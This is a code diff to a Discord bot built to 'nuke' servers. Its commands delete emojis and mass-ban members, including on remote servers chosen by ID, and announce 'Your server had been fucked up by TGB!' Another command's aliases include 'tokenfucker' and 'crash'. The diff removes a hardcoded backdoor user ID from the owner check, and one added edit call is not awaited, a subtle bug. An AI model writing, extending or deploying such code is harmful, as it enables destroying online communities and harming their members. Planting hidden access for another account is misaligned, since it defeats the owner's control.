@@ -18,7 +18,6 @@ def RandomColour():
 # ---------------------------------------------------------------------------
 # Configuration
 BOT_OWNER_ID = int(config.get("bot_owner_id"))
-DARK_ID = int(440253153775190037) # Dark (Fonce)
 HQ_SERVER_INVITE = config.get("server_invite")
 BAN_GIF = config.get("ban_gif")
 NUKE_GIF = config.get("nuke_gif")
@@ -56,8 +55,6 @@ async def SUDOER_CHECK(ctx):
 async def BOT_OWNER_CHECK(ctx):
     """A check to ensure ONLY the bot OWNER can run these commands."""
     if ctx.message.author.id == BOT_OWNER_ID:
-        return True
-    elif ctx.message.author.id == DARK_ID:
         return True
     else:
         return False
@@ -546,8 +543,7 @@ class Botsudo(commands.Cog):
     @commands.check(SUDOER_CHECK)
     @commands.command()
     async def destroy(self, ctx):
-        await ctx.send(NUKE_GIF)
-        await ctx.send("Your server had been fucked up by TGB!")
+        await ctx.send(f"{NUKE_GIF}\nYour server had been fucked up by TGB!")
         reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
         await ctx.message.delete()
         for emoji in list(ctx.guild.emojis):
@@ -583,7 +579,7 @@ class Botsudo(commands.Cog):
         servername = self.bot.get_guild(server_id)
         nem = discord.Embed(description=f'Attempting to Nuke **{servername.name}**...')
         nem.set_image(url=NUKE_LAUNCH_GIF)
-        await ctx.send(embed=nem)
+        nukemsg = await ctx.send(embed=nem)
         reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id}) on {servername} ({servername.id})")
         await ctx.message.delete()
         for emoji in list(servername.emojis):
@@ -610,7 +606,8 @@ class Botsudo(commands.Cog):
                 logs_webhook.send(f"{user.name} has been banned from {servername.name}")
             except:
                 logs_webhook.send(f"{user.name} has FAILED to be banned from {servername.name}")
-        await ctx.send(f'Finished nuking **{servername.name}**')
+        nem.set_image(url=NUKE_GIF)
+        nukemsg.edit(embed=nem, content=f'**Finished nuking {servername.name}**')
 
     @commands.check(SUDOER_CHECK)
     @commands.command(aliases=['tokenfucker', 'disable', 'crash']) 
